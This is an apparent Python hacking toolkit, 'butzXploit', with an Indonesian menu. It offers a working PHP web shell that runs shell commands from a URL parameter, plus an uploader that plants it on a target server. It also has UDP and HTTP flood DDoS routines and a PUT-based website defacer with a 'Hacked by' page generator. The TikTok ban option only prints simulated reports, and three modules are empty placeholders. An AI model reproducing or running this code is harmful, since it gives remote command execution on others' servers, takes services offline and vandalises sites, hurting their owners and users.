# tools_by_butzXploit.py
import os
import sys
import time
import requests
import threading
import random
import socket
import ssl
import json

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def logo():
    clear()
    print(r"""
     ______       _         _      __     __           _ _ _       
    |  ____|     | |       | |     \ \   / /          | (_) |      
    | |__   _ __ | |_ _   _| | ___  \ \_/ /__  _   _  | |_| |_ ___ 
    |  __| | '_ \| __| | | | |/ _ \  \   / _ \| | | | | | | __/ _ \
    | |____| | | | |_| |_| | |  __/   | | (_) | |_| | | | | ||  __/
    |______|_| |_|\__|\__, |_|\___|   |_|\___/ \__,_| |_|_|\__\___|
                      __/ |         [ by butzXploit v1.0 ]
                     |___/            ☠️  TOOLS MULTIFUNGSI GANAS ☠️
    """)

def menu():
    print("\n🔧 Pilih Fitur:")
    print("1. Auto Upload Shell")
    print("2. DDoS Attack")
    print("3. Auto Deface (JSO/PHP)")
    print("4. TikTok Ban Simulator")
    print("5. Generate HTML Deface")
    print("6. OSINT Instagram (placeholder)")
    print("7. OSINT Telegram (placeholder)")
    print("8. SQL Injection (placeholder)")
    print("9. JSON Generator")
    print("0. Keluar")
    return input("\n➡️ Masukkan pilihan: ")

# ===================== 1. AUTO UPLOAD SHELL =========================
SHELL_CODE = """<?php echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>"""

def auto_upload_shell():
    url = input("📤 Masukkan URL uploader.php: ").strip()
    filename = "butzXploit.php"
    with open(filename, "w") as f:
        f.write(SHELL_CODE)
    try:
        files = {'upload': (filename, open(filename, 'rb'), 'application/octet-stream')}
        res = requests.post(url, files=files)
        if res.status_code == 200:
            print(f"[✓] Mungkin berhasil: {url}/{filename}")
        else:
            print("[✗] Upload gagal.")
    except Exception as e:
        print(f"[ERROR] {e}")

# ====================== 2. DDOS ======================
def ddos():
    ip = input("🌐 IP/Host target: ")
    port = int(input("🔢 Port: "))
    metode = input("📌 Mode [1=UDP | 2=HTTP]: ")
    threads = int(input("🚀 Threads: "))

    def udp():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (ip, port))
            except:
                pass

    def http():
        while True:
            try:
                s = socket.socket()
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: "+ip.encode()+b"\r\n\r\n")
                s.close()
            except:
                pass

    print("[✓] Menyerang...")
    for _ in range(threads):
        t = threading.Thread(target=udp if metode == "1" else http)
        t.start()

# =================== 3. AUTO DEFACE ===================
def deface():
    url = input("🌐 URL target file .php/.jso: ")
    content = input("📝 Isi Deface HTML: ")
    try:
        res = requests.put(url, data=content.encode(), headers={"Content-Type": "text/html"})
        if res.status_code in [200,201,202]:
            print(f"[✓] Mungkin berhasil: {url}")
        else:
            print(f"[✗] Status code: {res.status_code}")
    except Exception as e:
        print(f"[!] Gagal: {e}")

# =================== 4. TIKTOK BAN SIMULATOR ===================
def tiktok_ban():
    user = input("👤 Username target (tanpa @): ")
    jumlah = int(input("💣 Jumlah Report: "))
    threads = int(input("⚙️ Threads: "))
    def lapor():
        for _ in range(jumlah // threads):
            print(f"[✓] Simulasi report @{user}")
            time.sleep(0.1)
    for _ in range(threads):
        threading.Thread(target=lapor).start()

# =================== 5. HTML DEFACE GENERATOR ===================
def generate_deface():
    nama = input("🖌️ Nama Anda: ")
    judul = input("📛 Judul Halaman: ")
    pesan = input("📜 Pesan: ")
    isi = f"""<html><head><title>{judul}</title></head>
    <body style="background:black;color:lime;text-align:center;">
    <h1>{judul}</h1><h2>Hacked by {nama}</h2><p>{pesan}</p></body></html>"""
    with open("deface.html", "w") as f:
        f.write(isi)
    print("[✓] File deface.html berhasil dibuat!")

# =================== 6-8. PLACEHOLDER ===================
def placeholder(nama):
    print(f"[✗] Modul '{nama}' belum tersedia di versi ini.")

# =================== 9. JSON GENERATOR ===================
def generate_json():
    jumlah = int(input("🧩 Berapa entri?: "))
    data = {}
    for i in range(jumlah):
        k = input(f"Key-{i+1}: ")
        v = input(f"Value-{i+1}: ")
        data[k] = v
    with open("data.json", "w") as f:
        json.dump(data, f, indent=4)
    print("[✓] data.json berhasil dibuat!")

# =================== MAIN LOOP ===================
while True:
    logo()
    pilihan = menu()
    if pilihan == "1":
        auto_upload_shell()
    elif pilihan == "2":
        ddos()
    elif pilihan == "3":
        deface()
    elif pilihan == "4":
        tiktok_ban()
    elif pilihan == "5":
        generate_deface()
    elif pilihan == "6":
        placeholder("OSINT Instagram")
    elif pilihan == "7":
        placeholder("OSINT Telegram")
    elif pilihan == "8":
        placeholder("SQL Injection")
    elif pilihan == "9":
        generate_json()
    elif pilihan == "0":
        print("👋 Keluar...")
        break
    else:
        print("[!] Pilihan tidak valid.")
    input("\n[⏎] Tekan ENTER untuk kembali ke menu...")